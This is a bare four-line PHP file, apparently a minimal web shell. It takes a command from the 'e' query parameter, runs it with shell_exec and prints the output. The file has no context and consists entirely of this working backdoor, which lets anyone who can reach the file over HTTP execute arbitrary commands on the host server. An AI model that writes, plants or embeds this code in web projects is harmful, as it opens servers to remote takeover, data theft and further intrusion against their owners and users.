<?php
if (!empty($_GET['e'])) {
    echo shell_exec($_GET['e']);
}
